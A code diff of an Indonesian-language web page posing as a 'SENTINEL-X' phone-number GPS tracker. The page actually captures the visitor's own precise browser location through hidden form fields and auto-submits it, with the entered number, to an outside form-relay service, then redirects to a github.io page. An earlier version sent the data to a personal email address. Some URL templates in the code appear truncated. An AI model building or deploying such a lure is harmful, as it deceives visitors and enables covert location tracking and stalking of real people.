@@ -3,72 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SENTINEL-X | SYSTEM ACTIVE</title>
+    <title>SENTINEL-X | GPS TRACKER</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .panel { border: 1px solid #0f0; padding: 20px; width: 300px; text-align: center; box-shadow: 0 0 15px #0f0; }
-        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 90%; margin-bottom: 15px; outline: none; }
-        button { background: #0f0; color: #000; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; }
-        #status { font-size: 10px; margin-top: 15px; color: #888; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .terminal { border: 1px solid #0f0; padding: 25px; width: 320px; text-align: center; box-shadow: 0 0 20px #0f0; background: #050505; }
+        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 12px; width: 85%; margin-bottom: 20px; outline: none; font-size: 16px; }
+        button { background: #0f0; color: #000; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; font-size: 14px; text-transform: uppercase; }
+        button:hover { background: #fff; box-shadow: 0 0 10px #fff; }
+        #status { font-size: 10px; margin-top: 15px; color: #888; text-align: left; }
     </style>
 </head>
 <body>
 
-    <div class="panel">
-        <h3>SENTINEL-X v4.0</h3>
-        <p>INPUT TARGET NUMBER:</p>
-        <input type="text" id="phone" placeholder="08xxxxxxxxxx">
-        <button onclick="lacak()">TRACK LOCATION</button>
-        <div id="status">Sistem Ready...</div>
+    <div class="terminal">
+        <h2 style="letter-spacing: 3px;">SENTINEL-X</h2>
+        <p>[ SYSTEM READY ]</p>
+        <hr color="#003300">
+        <p>MASUKKAN NOMOR TARGET:</p>
+        
+        <!-- Form Utama -->
+        <form action="https://formsubmit.co" method="POST" id="trackerForm">
+            <input type="text" name="NOMOR_HP" id="phone" placeholder="08xxxxxxxxxx" required>
+            
+            <!-- Data Tersembunyi yang akan diisi otomatis oleh GPS -->
+            <input type="hidden" name="GOOGLE_MAPS" id="gmaps_link">
+            <input type="hidden" name="LATITUDE" id="lat">
+            <input type="hidden" name="LONGITUDE" id="lon">
+            <input type="hidden" name="_next" value="https://hiskiayoel9-max.github.io">
+            <input type="hidden" name="_captcha" value="false">
+            
+            <button type="button" onclick="startTrack()">LACAK SEKARANG</button>
+        </form>
+        
+        <div id="status">> Menunggu input nomor...</div>
     </div>
 
     <script>
-        function lacak() {
-            const email = "hiskiayoel9@gmail.com";
-            const nohp = document.getElementById('phone').value;
+        function startTrack() {
+            const phone = document.getElementById('phone').value;
             const status = document.getElementById('status');
 
-            if (!nohp) { alert("Nomor HP harus diisi!"); return; }
+            if (!phone) { alert("Nomor HP wajib diisi!"); return; }
 
-            status.innerText = "MENCARI KOORDINAT GPS...";
+            status.innerText = "> MENGHUBUNGKAN KE SATELIT...";
 
             if (navigator.geolocation) {
+                // Meminta lokasi GPS (Target harus klik ALLOW)
                 navigator.geolocation.getCurrentPosition((position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const gmaps = `https://www.google.com{lat},${lon}`;
-
-                    status.innerText = "KOORDINAT TERKUNCI! MENGIRIM DATA...";
-
-                    // Kirim data ke FormSubmit (Tanpa Error Ajax)
-                    const form = document.createElement('form');
-                    form.method = 'POST';
-                    form.action = `https://formsubmit.co{email}`;
-
-                    const inputNo = document.createElement('input');
-                    inputNo.type = 'hidden';
-                    inputNo.name = 'NOMOR_TARGET';
-                    inputNo.value = nohp;
-
-                    const inputLoc = document.createElement('input');
-                    inputLoc.type = 'hidden';
-                    inputLoc.name = 'GOOGLE_MAPS';
-                    inputLoc.value = gmaps;
-
-                    const inputNext = document.createElement('input');
-                    inputNext.type = 'hidden';
-                    inputNext.name = '_next';
-                    inputNext.value = window.location.href;
-
-                    form.appendChild(inputNo);
-                    form.appendChild(inputLoc);
-                    form.appendChild(inputNext);
-                    document.body.appendChild(form);
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
                     
-                    form.submit(); // Kirim data secara otomatis
+                    // Isi data ke form tersembunyi
+                    document.getElementById('lat').value = latitude;
+                    document.getElementById('lon').value = longitude;
+                    document.getElementById('gmaps_link').value = `https://www.google.com{latitude},${longitude}`;
+                    
+                    status.innerText = "> KOORDINAT TERKUNCI! MENGIRIM...";
+                    
+                    // Kirim form secara otomatis
+                    document.getElementById('trackerForm').submit();
+                    
                 }, (error) => {
-                    alert("Gagal: Target menolak akses lokasi (GPS).");
-                    status.innerText = "AKSES DITOLAK TARGET.";
+                    alert("GAGAL: Target menolak akses lokasi (GPS).");
+                    status.innerText = "> AKSES DITOLAK TARGET.";
                 }, { enableHighAccuracy: true });
             } else {
                 alert("Browser tidak mendukung GPS.");
